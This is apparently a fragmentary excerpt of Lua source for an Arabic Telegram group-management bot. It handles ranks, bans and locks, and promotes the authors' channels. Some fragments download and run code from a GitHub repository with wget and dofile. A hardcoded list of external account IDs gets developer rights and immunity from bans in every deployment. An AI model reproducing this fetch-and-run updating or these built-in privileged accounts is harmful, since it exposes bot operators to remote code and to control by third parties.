...
io.write('\27[0;31m\n ارسل لي توكن البوت الان ☭உஉஉ ᏟᏞᎪՏՏᎥᏟ உஉஉ☭ ┉ ┉ :\na☭உஉஉ ᏟᏞᎪՏՏᎥᏟ உஉஉ☭ ┉ ┉\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m☭உஉஉ ᏟᏞᎪՏՏᎥᏟ உஉஉ☭ ┉ ┉\n التوكن غير صحيح تاكد منه ثم ارسله')
else
...
print('\27[0;35m☭உஉஉ ᏟᏞᎪՏՏᎥᏟ உஉஉ☭ ┉ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ☭உஉஉ ᏟᏞᎪՏՏᎥᏟ உஉஉ☭ ┉ ┉ :\na☭உஉஉ ᏟᏞᎪՏՏᎥᏟ உஉஉ☭ ┉ ┉\n\27[0;33;49m')
...
io.write('\27[1;31m ☭உஉஉ ᏟᏞᎪՏՏᎥᏟ உஉஉ☭ ┉ ┉ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "☭உஉஉ ᏟᏞᎪՏՏᎥᏟ உஉஉ☭ ┉ ┉☭உஉஉ ᏟᏞᎪՏՏᎥᏟ உஉஉ☭ ┉ ┉"
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Gold-So/classic/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1869163387,1859346570,1600370037,1261853045,1747353186,1859008079}   
...
var = true
elseif tonumber(user_id) == tonumber(1747353186) then
var = true
...
local UserName = (data.username_ or "boyka_x2")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 🦹‍♂ ՏᎡᏟ ᏟᏞᎪՏՏᎥᏟ 🦹‍♂")  
...
local boyka_x2 = database:get(bot_id..'text:ch:user')
if boyka_x2 then
send(msg.chat_id_, msg.id_,'['..boyka_x2..']')
else
...
os.execute('wget https://raw.githubusercontent.com/Gold-So/classic/main/DRAGON.lua')
...
if text == 'عايز بويكا' or text == 'بويكا التاني' or text == 'بويكا القامد' or text == 'بويكا الصغير' or text == 'مطور السورس' or text == 'فين بويكا'  or text == 'بويكا فين' then
local Text = [[
مطور السورس يرايق
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𓆩🤍𓆪 بــويــكــا الـتــانـي 𓆩🤍𓆪',url="t.me/ha_rr_y_ha_ma"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس️️', url="t.me/boyka_x2"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
usertext = '\n ☭ العضو ← ['..result.title_..'](t.me/'..(username or 'boyka_x2')..')'
status  = '\n ☭ تم ترقيته مطور'
...
usertext = '\n ☭ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'boyka_x2')..')'
status  = '\n ☭ تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ☭ العضو ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'boyka_x2')..') \n ☭ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "كلاسيك")
...
send(msg.chat_id_,0," ☭ العضو : {["..data.first_name_.."](T.ME/boyka_x2)}\n ☭ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ☭ عذرا ← {["..data.first_name_.."](T.ME/boyka_x2)}\n ☭ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/Gold-So/classic/main/DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/Gold-So/classic/main/library')
os.execute('wget https://raw.githubusercontent.com/Gold-So/classic/main/File_Bot')
send(msg.chat_id_, msg.id_,' ☭ تم تحديث السورس')
dofile('DRAGON.lua')  
end
...
[𝐖𝐄𝐋𝐂𝐎𝐌 𝐓𝐎 𝐒𝐎𝐔𝐑𝐂𝐄](t.me/boyka_x2)
             
╰──── 𝐂𝐋𝐀𝐒𝐒𝐈𝐂 ────╯
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '  ❨ 🦹‍♂ ᏟᎻ 🦹‍♂ ❩ ', url="t.me/boyka_x2"}},
{{text = '  ❨ 🦹‍♂ᏴΌᎻᏦᎪ₂ ',url="t.me/ha_rr_y_ha_ma"},{text = ' ᏀᎪᏴᎡᎬ 🦹‍♂ ❩ ',url="t.me/G_G_A_B_E_3"}},
{{text = '  ❨ 🦹‍♂ ᎬᏞᎪᎡᎻᏴY 🦹‍♂  ❩ ', url="t.me/Mody01110"}},
}
local msg_id = msg.id_/2097152/0.5
...
local Text = [[
 🦹‍♂ اهلا بك في سورس كلاسيك الجمدان لو عايز بوت بأسعار منسبه وبوت مميز كلمني  🦹‍♂ 
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '  ❨ 🦹‍♂ ᏟᎻ 🦹‍♂ ❩ ', url="t.me/boyka_x2"}},
...
if text == 'بويكا الكبير' or text == 'بويكا' or text == 'بويكا اليكس' or text == 'بويكا الكبير' or text == 'بويكا اليكس' or text == 'صاحب الابليكيشن' or text == 'مبرمج السورس'  then
local Text = [[
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text =  'SOURCE CLASSIC' ,url="t.me/boyka_x2"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '  ❨ 🦹‍♂ 𝐒𝐎𝐔𝐑𝐂𝐄 🦹‍♂  ❩', url="t.me/boyka_x2"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == '☭உஉஉ ᏟᏞᎪՏՏᎥᏟ உஉஉ☭' then
local Text = [[ 
...
local Text = [[ 
[𝐁𝐎𝐘𝐊𝐀](t.me/ha_rr_y_ha_ma)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '  ❨ 🦹‍♂ بــويــكــا الـتــانـي 🦹‍♂  ❩', url="t.me/ha_rr_y_ha_ma"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '  ❨ جــبــري الــكـبـيـرر🦹‍♂  ❩',url="t.me/G_G_A_B_E_3"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local Name = '[《⬇️اتبع الازرار للتواصل مع》](t.me/boyka01)\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《𝐒》CLASSIC🌺 ', url="t.me/boyka_x2"}}, 
{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
keyboard = {}   
keyboard.inline_keyboard = {  
 {{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 CLASSIC》', url="t.me/boyka_x2"}},
}  
local msg_id = msg.id_/2097152/0.5  
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ☭ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'boyka_x2')..') \n ☭ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ☭ بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'boyka_x2')..') \n ☭ تـم قفـل التاك بالكتم ')
end,nil)   
...
if tonumber(result.sender_user_id_) == tonumber(1261853045) then  
send(msg.chat_id_, msg.id_, " ☭ لا تسطيع حظر مطور السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1747353186) then  
send(msg.chat_id_, msg.id_, " ☭ لا تسطيع حظر مطور السورس عام")
return false 
end
...
if result.id_ == tonumber(1261853045) then
send(msg.chat_id_, msg.id_, " ☭ لا تسطيع حظر مطور السورس عام \n")
return false 
end
...
if result.id_ == tonumber(1747353186) then
send(msg.chat_id_, msg.id_, " ☭ لا تسطيع حظر مطور السورس عام \n")
return false 
end
...
if tonumber(userid) == tonumber(1261853045) then  
send(msg.chat_id_, msg.id_, " ☭ لا تسطيع حظر مطور السورس عام")
return false 
end
if tonumber(userid) == tonumber(1747353186) then  
send(msg.chat_id_, msg.id_, " ☭ لا تسطيع حظر مطور السورس عام")
return false 
end
...
if result.id_ == tonumber(1859008079) then
send(msg.chat_id_, msg.id_, " ☭ لا تسطيع المبرمج اوس اوس عام \n")
return false 
end
if result.id_ == tonumber(1747353186) then
send(msg.chat_id_, msg.id_, " ☭ لا تسطيع كتم مطور السورس عام \n")
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Gold-So/classic/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ☭ اهلا بك في متجر ملفات كلاسيك\n ☭ ملفات السورس ↓\n≪◤━───━??𝗼𝗼𝗼𝗻━───━◥≫\n\n"
local TextE = "\n☭உஉஉ ᏟᏞᎪՏՏᎥᏟ உஉஉ☭\n ☭ علامة تعني { ✔️ } ملف مفعل\n ☭ علامة تعني { ✖ } ملف معطل\n ☭ قناة سورس كلاسيك ↓\n".." ☭ [اضغط هنا لدخول](t.me/boyka_x2) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/Gold-So/classic/main/File_Bot/"..file)
if res == 200 then
...
Reply_Status(msg,result.sender_user_id_,"reply","☭ تم تنزيله من مطور ثانوي")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DRAGON, nil)
return false 
end
...
Reply_Status(msg,result.id_,"reply","☭ تم تنزيله من مطور ثانوي")  
else
send(msg.chat_id_, msg.id_,"☭ لا يوجد حساب بهاذا المعرف")
end
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ☭ لعضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'boyka_x2')..')'
status  = '\n ☭ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ☭ العضو ← '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ☭ العضــو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'boyka_x2')..')'
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ☭ العضو ← ['..result.title_..'](t.me/'..(text1[3] or 'boyka_x2')..')'..'\n ☭ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🦹‍♂ ՏᎡᏟ ᏟᏞᎪՏՏᎥᏟ 🦹‍♂.',url="t.me/boyka_x2"}},
}
local msg_id = msg.id_/2097152/0.5
...
database:set(bot_id.."boyka_x2:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,' تم تفعيل الانستا')
database:set(bot_id.."boyka_x2:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."boyka_x2:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."boyka_x2:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"☭تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."boyka_x2:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."boyka_x2:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/boyka_x2)') 
return false
end

if text == 'انا مين' and DevSoFi(msg) then 
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me